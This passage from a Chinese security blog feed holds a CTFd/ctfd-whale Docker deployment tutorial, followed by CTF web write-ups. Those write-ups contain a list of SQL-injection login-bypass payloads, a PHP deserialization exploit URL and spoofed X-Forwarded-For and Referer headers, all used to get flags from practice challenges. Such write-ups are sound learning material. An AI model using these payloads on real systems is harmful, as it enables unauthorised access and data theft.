  #可改  cache:    image: redis:4    restart: always    volumes:      - .data&#x2F;redis:&#x2F;data    networks:        internal:    cpus: &#39;1.00&#39;     #可改    mem_limit: 450M     #可改  frpc:        image: glzjin&#x2F;frp:latest     #赵师傅tql    restart: always    volumes:      - .&#x2F;frpc:&#x2F;conf&#x2F;     #这里注意    entrypoint:        - &#x2F;usr&#x2F;local&#x2F;bin&#x2F;frpc        - -c        - &#x2F;conf&#x2F;frpc.ini    networks:        frp:            ipv4_address: 172.1.0.3  #记住此处        frp-containers:    cpus: &#39;1.00&#39;     #可改    mem_limit: 250M     #可改networks:    default:    internal:        internal: true    frp:        driver: bridge        ipam:            config:                - subnet: 172.1.0.0&#x2F;16    frp-containers:        driver: overlay        internal: true        ipam:            config:                - subnet: 172.2.0.0&#x2F;16</code></pre><p>然后<strong>注意！注意！注意！</strong></p><p>在docker-compose.yml同目录下建nginx文件夹，即与第一个#这里注意相应，然后建<code>http.conf</code>文件写入以下内容</p><pre class="language-none"><code class="language-none">worker_processes 4;events &#123;  worker_connections 1024;&#125;http &#123;  # Configuration containing list of application servers  upstream app_servers &#123;    server ctfd:8000;  &#125;  server &#123;    listen 80;    client_max_body_size 4G;    # Handle Server Sent Events for Notifications    location &#x2F;events &#123;      proxy_pass http:&#x2F;&#x2F;app_servers;      proxy_set_header Connection &#39;&#39;;      proxy_http_version 1.1;      chunked_transfer_encoding off;      proxy_buffering off;      proxy_cache off;      proxy_redirect off;      proxy_set_header Host $host;      proxy_set_header X-Real-IP $remote_addr;      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      proxy_set_header X-Forwarded-Host $server_name;    &#125;    # Proxy connections to the application servers    location &#x2F; &#123;      proxy_pass http:&#x2F;&#x2F;app_servers;      proxy_redirect off;      proxy_set_header Host $host;      proxy_set_header X-Real-IP $remote_addr;      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      proxy_set_header X-Forwarded-Host $server_name;    &#125;  &#125;&#125;</code></pre><p>在docker-compose.yml同目录下建frpc文件夹，即与第二个#这里注意相应，然后进入解压的/frp_0.29.0_linux_amd64文件夹，或直接上传，将</p><pre class="language-none"><code class="language-none">frpcfrpc.inifrpc_full.iniLICENSE</code></pre><p>放入frpc文件夹<br>接着配置frpc.ini，直接上配置</p><pre class="language-none"><code class="language-none">[common]token &#x3D; randommeserver_addr &#x3D; 172.1.0.4server_port &#x3D; 6490     #此处必须与frpc.ini配置一致pool_count &#x3D; 200tls_enable &#x3D; trueadmin_addr &#x3D; 172.1.0.3 #一定要加！！与后面相应admin_port &#x3D; 7400</code></pre><p>此处非常重要，之前本人在这里踩了好多次坑。</p><h3 id="5-配置Dockerfile"><a href="#5-配置Dockerfile" class="headerlink" title="5.配置Dockerfile"></a>5.配置Dockerfile</h3><p>还是直接上配置，<strong>Dockerfile</strong></p><pre class="language-none"><code class="language-none">FROM python:3.7-alpine  #如果出现问题可尝试更换python，一般不需要RUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories &amp;&amp; \    apk update &amp;&amp; \    apk add linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev   #这里注意1RUN adduser -D -u 1001 -s &#x2F;bin&#x2F;bash ctfdWORKDIR &#x2F;opt&#x2F;CTFdRUN mkdir -p &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsCOPY requirements.txt .RUN pip install -r requirements.txt -i https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;pypi&#x2F;web&#x2F;simple&#x2F;   #这里注意2COPY . &#x2F;opt&#x2F;CTFdRUN for d in CTFd&#x2F;plugins&#x2F;*; do \      if [ -f &quot;$d&#x2F;requirements.txt&quot; ]; then \        pip install -r $d&#x2F;requirements.txt -i https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;pypi&#x2F;web&#x2F;simple&#x2F; ; \      fi; \    done;RUN chmod +x &#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.shRUN chown -R 1001:1001 &#x2F;opt&#x2F;CTFdRUN chown -R 1001:1001 &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsUSER 1001EXPOSE 8000ENTRYPOINT [&quot;&#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh&quot;]</code></pre><p>注意点：</p><ol><li>第一处的镜像源可百度更换其它源，例如</li></ol><p><code>sed -i &#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g&#39; /etc/apk/repositories</code><br>注意如果出现问题检查下最后有没有<code>&amp;&amp; \</code></p><ol start="2"><li>python版本一般不需要换</li><li>RUN第三行我将python和python-dev删掉了，如果要加上则会报错<code>python requires by world</code>之类的，请加上<code>python2</code>或<code>python3</code>，<code>python2-dev</code>或<code>python3-dev</code>.即可解决。删掉后没有发现对服务有什么影响</li><li>所有<code>-i &quot;url&quot;</code>都是指定源，如果下载失败则可更换源再试</li><li>第二处注意即我更换了源，因为之前看其他教程下载失败了</li></ol><h3 id="6-准备完毕"><a href="#6-准备完毕" class="headerlink" title="6.准备完毕"></a>6.准备完毕</h3><p>运行<code>docker-compose build</code><br>静待完成</p><img src="/article/CTFD/20201017233234439.png" class="" title="build"><p>然后运行<code>docker-compose up -d</code></p><img src="/article/CTFD/20201017233300241.png" class="" title="up"><p>如图所示，有WARNING即为在集群网络类，是正常情况<br>运行<code>docker ps</code>查看容器情况</p><img src="/article/CTFD/20201017233329640.png" class="" title="ps"><p>访问 <a href="http://ip:8000/">http://ip:8000</a> 即可访问ctfd</p><h3 id="配置CTFD"><a href="#配置CTFD" class="headerlink" title="配置CTFD"></a>配置CTFD</h3><p>进入后随便设置，然后进Admin Panel进行设置</p><table><thead><tr><th>属性</th><th>配置</th></tr></thead><tbody><tr><td>Docker API URL</td><td>unix://var/run/docker.sock</td></tr><tr><td>Frp API IP</td><td>frpc的ip配置</td></tr><tr><td>Frp API Port</td><td>frpc的端口配置</td></tr><tr><td>Frp Http Domain Suffix</td><td>Docker API URL to connect（可填None）</td></tr><tr><td>Frp Http Port</td><td>80</td></tr><tr><td>Frp Direct IP Address</td><td>你的公网ip，本机即为127.0.0.1</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最小端口呼应</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最大端口呼应</td></tr><tr><td>Max Container Count</td><td>不超过最大-最小</td></tr><tr><td>Max Renewal Times</td><td>最大实例延时次数</td></tr><tr><td>Frp config template</td><td>填入frps的配置，只需填[common]</td></tr><tr><td>Docker Auto Connect Containers</td><td>ctfd_frpc_1</td></tr><tr><td>Docker Dns Setting</td><td>可填机器内DNS，没有可填个外网DNS</td></tr><tr><td>Docker Swarm Nodes</td><td>linux-1   与前面swarm集群呼应</td></tr><tr><td>Docker Multi-Container Network Subnet</td><td>内网题大子网ip配置/CIDR</td></tr><tr><td>Docker Multi-Container Network Subnet New Prefix</td><td>每个内网题实例的CIDR</td></tr><tr><td>Docker Container Timeout</td><td>单位为秒</td></tr></tbody></table><p>最后附上我的配置图片</p><img src="/article/CTFD/20201017233350699.png" class="" title="配置1"><img src="/article/CTFD/20201017233413853.png" class="" title="配置2"><img src="/article/CTFD/20201017233431163.png" class="" title="配置3"><h3 id="设置docker网络"><a href="#设置docker网络" class="headerlink" title="设置docker网络"></a>设置docker网络</h3><p>这个时候运行<code>docker ps</code><br>发现frpc在无限重启，因为我们还没有配置网络<br>运行<code>docker network ls</code></p><img src="/article/CTFD/20201017234359215.png" class="" title="容器"><p>显示ctfd_frp-containers</p><p>运行<code>docker network inspect ctfd_frp</code></p><img src="/article/CTFD/20201017234428683.png" class="" title="ctfd_frp"><p>这个是docker-compose里compose后创建的网络，我们将frps加入此网络，例如我的frp容器id为12345，则运行<code>docker network connect ctfd_frp 12345&lt;即frp容器id&gt;</code>。再运行<code>docker network inspect ctfd_frp</code>，如下<img src="/article/CTFD/20201017234344822.png" class="" title="在这里插入图片描述"></p><p>这里可以看到ip与我们之前设置的相应。</p><p>此时运行<code>docker restart ctfd_frpc_1 frp_frps_1</code></p><p>然后<code>docker ps</code></p><p>最终如下<img src="/article/CTFD/20201017234457228.png" class="" title="ps"></p><p>成功完成。</p><p>最后设置道题目选择（我做了汉化）</p><img src="/article/CTFD/20201017233701655.png" class="" title="题目1"><img src="/article/CTFD/20201017233922648.png" class="" title="题目2"><img src="/article/CTFD/20201017234241273.png" class="" title="在这里插入图片描述"><p><code>docker ps</code>里可以看到容器成功启动，地址正常访问</p><h3 id="坑点注意"><a href="#坑点注意" class="headerlink" title="坑点注意"></a>坑点注意</h3><ol><li>如果frpc重复出现retrying，请返回检查docker-compose.yml。找到frpc设置，检查ip设置是否正确。再检查ctfd的Admin Panel里ctfd-whale设置是否正确。</li><li>如果出现安装某个文件失败问题，请更换源，很多都是源里没有指定文件造成的。可以自行访问一下网站，查看一下要下载的文件名，再进行配置。</li><li>似乎docker和系统的版本会有影响，本机为CentOS7.4 64位，腾讯云，docker配置如下</li></ol><img src="/article/CTFD/20201017234315447.png" class="" title="版本"><ol start="4"><li><p>python的问题，上面提到的，可以删除，是因为没有指定版本的原因，也可以指定版本再下载</p></li><li><p>ctfd运行<code>docker-compose up -d</code>后有可能提示docker-entrypoint.sh没有权限，手动加个权限即可。在CTFd文件夹下运行<code>chmod a+x docker-entrypoint.sh</code>（docker-compose.yml里其实写了加权限，但是最后并没有加上去？）</p></li><li><p>如果docker容器无法启动或者frp端口无法映射可以进容器检查 </p><p>确保docker api填写正确，如docker-compose.yml中写的unix:///var/run/docker.sock<br>你也可以使用端口形式的api如<a href="https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd">官方示例</a>：可以用IP：端口指定API</p><h6 id="docker容器无法启动问题"><a href="#docker容器无法启动问题" class="headerlink" title="docker容器无法启动问题"></a>docker容器无法启动问题</h6><p>进入容器检查：</p><pre class="language-none"><code class="language-none">docker exec -it &lt;ctfd容器id&gt; sh&#x2F;opt&#x2F;CTFd# python&gt;&gt;&gt;import docker&gt;&gt;&gt;client&#x3D;docker.DockerClient(base_url&#x3D;&quot;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock&quot;)&gt;&gt;&gt;client.images.list()</code></pre><p> 如果api正确会列出所有镜像 </p><h6 id="frp端口无法映射问题"><a href="#frp端口无法映射问题" class="headerlink" title="frp端口无法映射问题"></a>frp端口无法映射问题</h6><p>进入容器检查：</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;其实检查可以顺便检查一下上面的，因为都在ctfd容器内docker exec -it &lt;ctfd容器id&gt; sh&#x2F;opt&#x2F;CTFd# python&gt;&gt;&gt;import requests&gt;&gt;&gt;requests.get(&quot;http:&#x2F;&#x2F;172.1.0.3:7400&#x2F;api&#x2F;reload&quot;)&#x2F;&#x2F;即frp api的地址返回&lt;Response [200]&gt; #表示成功</code></pre><p>如果frpc还是出现如下问题</p><pre class="language-none"><code class="language-none">requests.exceptions.ConnectionError: HTTPConnectionPool(host&#x3D;&#39;172.1.0.3&#39;, port&#x3D;7400): Max retries exceeded with url: &#x2F;api&#x2F;reload (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f8df919f850&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#39;))</code></pre><p>则重新配置frpc。编辑/CTFd/frpc/frpc.ini</p><pre class="language-none"><code class="language-none">[common]token &#x3D; randommeserver_addr &#x3D; 172.1.0.4server_port &#x3D; 6490pool_count &#x3D; 200tls_enable &#x3D; trueadmin_addr &#x3D; 172.1.0.3 #这里千万千万别忘加，之前要被搞气死admin_port &#x3D; 7400</code></pre><p>然后运行<code>docker restart ctfd_frpc_1</code>（这里再看frpc.ini会发现内容更新了，admin配置没了，不用担心）</p><p>再进容器检查<code>requests.get(&quot;http://172.1.0.3:7400/api/reload&quot;)</code>应该就可以了<code>&lt;Response [200]&gt;</code></p></li></ol><ol start="7"><li><p>遇事不决请重启</p></li><li><p>如果发现frp端口冲突，请检查本地frpc或者frps服务，frp是在docker上<strong>不是在本地</strong>的！</p><pre class="language-none"><code class="language-none">systemctl stop frpcsystemctl stop frps</code></pre></li></ol><ol start="9"><li><p>活用查看log</p><pre class="language-none"><code class="language-none">docker logs &lt;ctfd容器id&gt;docker logs &lt;frp容器id&gt;</code></pre></li><li><p>如果修改了任意配置，请跟着修改<strong>系列配置</strong>，很多就是因为漏改造成的</p></li></ol><p>11.docker ps显示正常但是无法访问</p><p> 可以使用 <code>docker logs ctfd_ctfd_1</code> 查看输出，如果发现输出类似： </p><pre class="language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;tzlocal&#x2F;unix.py:158: UserWarning: Can not find any timezone configuration, defaulting to UTC.  warnings.warn(&#39;Can not find any timezone configuration, defaulting to UTC.&#39;)Starting CTFd&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)[2020-10-11 12:31:30 +0000] [1] [INFO] Starting gunicorn 19.9.0[2020-10-11 12:31:30 +0000] [1] [INFO] Listening at: http:&#x2F;&#x2F;0.0.0.0:8000 (1)[2020-10-11 12:31:30 +0000] [1] [INFO] Using worker: gevent[2020-10-11 12:31:30 +0000] [21] [INFO] Booting worker with pid: 21[2020-10-11 12:31:31 +0000] [23] [INFO] Booting worker with pid: 23[2020-10-11 12:31:32 +0000] [25] [INFO] Booting worker with pid: 25[2020-10-11 12:31:34 +0000] [27] [INFO] Booting worker with pid: 27[2020-10-11 12:31:35 +0000] [29] [INFO] Booting worker with pid: 29[2020-10-11 12:31:36 +0000] [31] [INFO] Booting worker with pid: 31[2020-10-11 12:31:37 +0000] [33] [INFO] Booting worker with pid: 33[2020-10-11 12:31:39 +0000] [35] [INFO] Booting worker with pid: 35[2020-10-11 12:31:40 +0000] [37] [INFO] Booting worker with pid: 37(一直在加)</code></pre><p> 则问题为<a href="https://stackoverflow.com/questions/64105616/greenlet-runtime-error-and-deployed-app-in-docker-keeps-booting-all-the-workers">这篇文章中所提到的问题</a>，只需要删除 <code>requirements.txt</code> 中的 <code>gevent</code> 版本号即可，结果类似下面这样 </p><pre class="language-none"><code class="language-none">&#x2F;requirements.txt...redis&#x3D;&#x3D;3.3.11datafreeze&#x3D;&#x3D;0.1.0geventpython-dotenv&#x3D;&#x3D;0.10.3flask-restplus&#x3D;&#x3D;0.13.0...</code></pre><p> 然后 <code>docker-compose down</code> 再启动 <code>docker-compose up -d --build</code> 不出意外应该就能解决问题 </p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p> <a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a>(赵师傅官方)</p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756/">手把手教你如何建立一个支持ctf动态独立靶机的靶场（ctfd+ctfd-whale）</a></p><p> <a href="https://vaala.cat/2020/09/21/ctfd%E4%BD%BF%E7%94%A8ctfd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA%E6%8F%92%E4%BB%B6%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E6%8C%87%E5%8D%97/">ctfd使用ctfd-whale动态靶机插件搭建靶场指南</a></p><p>如果有问题请私信联系我，不足之处敬请谅解</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> ctfd </tag>
            
            <tag> ctf-whale </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Asuri_ctf WEB Write-up</title>
      <link href="article/Asuri_ctf-WEB-Write-up/"/>
      <url>article/Asuri_ctf-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2>[nuaactf2019]web签到</h2><h3>F12</h3>题目地址：<a class="url" href="http://106.15.177.94:10001/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10001/</a><p>f12直接看源码</p><h3>最终</h3>问题解决：nuaactf{we1cOme_to_NuaAcTF}<hr /><h2>神奇的php</h2><h3>代码审计</h3>题目地址：<a class="url" href="http://106.15.177.94:10017/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10017/</a><p>打开直接给源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//寮曞叆flag鍜宎bc鍙橀噺</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$abc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>get直接收个a参数，a=abc就出flag，非常简单</p><h3>最终</h3>payload：./?a=abc<p>问题解决：Asuri{php_is_amazing}</p><hr /><h2>GET</h2><h3>怀疑asuri水题</h3>题目地址：<a class="url" href="http://106.15.177.94:10019" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10019</a><p>打开得源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php涓�$flag鍙橀噺</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ans'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ans'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'hello_world'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>不说了</p><h3>最终</h3>payload：./ans=hello_world<p>问题解决：Asuri{get_is_simple}</p><hr /><h2>管理员</h2><h3>sql注入</h3>题目地址：<a class="url" href="http://106.15.177.94:10012/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10012/</a><p>打开提示登录管理员</p><p>尝试登录：<code>1' or 1=1 #</code></p><p>直接登录成功了…</p><p>后来尝试，还有多种payload</p><h3>最终</h3>payload：<pre><code>' or 0=0 #' or 1=1 or ''='x' or 1=1 or 'x'='ya' or 'a' = 'aanything' OR 'x'='x'%20or%20''=''%20or%20'x'='x' or 0=0 #' or 1 --'' or 1=1 or ''='hi' or 'a'='a' or username like '%' or 1=1 or ''='' or ''='x' or 1=1 or 'x'='y</code></pre>大同小异，都记录下来，日后学习<p>问题解决：Asuri{Web_1s_easy}</p><hr /><h2>管理员2</h2><h3>同上</h3>一样，payload登录提示要从本地登录加个<code>X-Forwarded-For: 127.0.0.1</code>即可<h3>最终</h3>问题解决：Asuri{1m_Adm1n}<hr /><h2>php序列化</h2><h3>序列化</h3><h4>告诉我靶场题目有问题???我淦</h4>题目地址：<del><a class="url" href="http://106.15.177.94:10014" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10014</a></del>新地址：<a class="url" href="http://desperadoccy.club:39016" target="_blank" rel="noopener noreferrer">http://desperadoccy.club:39016</a><p>有时间再写</p><h3>最终</h3>payload：<code>http://desperadoccy.club:39016/?exp=O:10:%22FileReader%22:4:&#123;s:8:%22Filename%22;S:4:%22\66lag%22;s:5:%22start%22;i:0;s:10:%22max_length%22;i:5;&#125;</code>&&<code>http://desperadoccy.club:39016/?exp=O:10:%22FileReader%22:4:&#123;s:8:%22Filename%22;S:4:%22\66lag%22;s:5:%22start%22;i:6;s:10:%22max_length%22;i:13;&#125;</code><p>问题解决：Asuri{php_serial1ze}</p><hr />]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0XGame WEB Write-up</title>
      <link href="article/0XGame-WEB-Write-up/"/>
      <url>article/0XGame-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><h3 id="考察robots协议"><a href="#考察robots协议" class="headerlink" title="考察robots协议"></a>考察robots协议</h3><h4 id="题目地址：http-web-game-0xctf-com-30051"><a href="#题目地址：http-web-game-0xctf-com-30051" class="headerlink" title="题目地址：http://web.game.0xctf.com:30051/"></a>题目地址：<a href="http://web.game.0xctf.com:30051/">http://web.game.0xctf.com:30051/</a></h4><p>知识链接：</p><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p><p>直接访问./robots.php</p><pre class="language-none"><code class="language-none">User-agent: *Allow: &#x2F;User-agent: CTFerDisallow: &#x2F;flaaaggg.php</code></pre><h3 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h3><p>访问/flaaaggg.php即可</p><p>问题解决：0xGame{now_you_k0nw_robots_Protocol}</p><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>考察会不会看源码</p><h3 id="最终-1"><a href="#最终-1" class="headerlink" title="最终"></a>最终</h3><p>f12看源码就行</p><p>问题解决：0xGame{web_sign_in}</p><h2 id="get-amp-post"><a href="#get-amp-post" class="headerlink" title="get&amp;post"></a>get&amp;post</h2><h3 id="考察get与post的应用"><a href="#考察get与post的应用" class="headerlink" title="考察get与post的应用"></a>考察get与post的应用</h3><p>打开直接给代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'acd666tql'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$c</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Do you konw GET &amp; POST ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>代码审计，get传参，post传参即可</p><h3 id="最终-2"><a href="#最终-2" class="headerlink" title="最终"></a>最终</h3><p>payload：<code>./?0xGame=acd666tql</code><br>post:<code>X1cT34m=acd666tql</code></p><p>问题解决：0xGame{Get_4nd_P0sT_1s_eA5y}</p><h2 id="wh1sper’s-secret-garden"><a href="#wh1sper’s-secret-garden" class="headerlink" title="wh1sper’s_secret_garden"></a>wh1sper’s_secret_garden</h2><h3 id="考察http协议"><a href="#考察http协议" class="headerlink" title="考察http协议"></a>考察http协议</h3><h4 id="题目地址：http-web-game-0xctf-com-30050"><a href="#题目地址：http-web-game-0xctf-com-30050" class="headerlink" title="题目地址：http://web.game.0xctf.com:30050/"></a>题目地址：<a href="http://web.game.0xctf.com:30050/">http://web.game.0xctf.com:30050/</a></h4><p>打开发现：</p><pre class="language-none"><code class="language-none">你需要使用wh1sper浏览器来访问什么？没有？没有wh1sper浏览器还想打web？</code></pre><p>抓包改包,浏览器改成wh1sper</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: web.game.0xctf.com:30050Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>然后发现</p><pre class="language-none"><code class="language-none">你需要来自：https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;</code></pre><p>伪造地址三种方式：</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><p>这里<code>Referer: https://ctf.njupt.edu.cn/</code></p><p>再发包，发现</p><pre><code>你得从本地访问才行哟！</code></pre><p>改包，加上<code>X-Forwarded-For: 127.0.0.1</code></p><h3 id="最终-3"><a href="#最终-3" class="headerlink" title="最终"></a>最终</h3><p>发包：</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: web.game.0xctf.com:30050Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Referer: https:&#x2F;&#x2F;ctf.njupt.edu.cn&#x2F;X-Forwarded-For: 127.0.0.1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) wh1sper&#x2F;84.0.4147.135 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>问题解决：0xGame{宁就是接头霸王?}</p><h2 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h2><h3 id="考察linux指令"><a href="#考察linux指令" class="headerlink" title="考察linux指令"></a>考察linux指令</h3><h4 id="题目地址：http-web-game-0xctf-com-30054"><a href="#题目地址：http-web-game-0xctf-com-30054" class="headerlink" title="题目地址：http://web.game.0xctf.com:30054/"></a>题目地址：<a 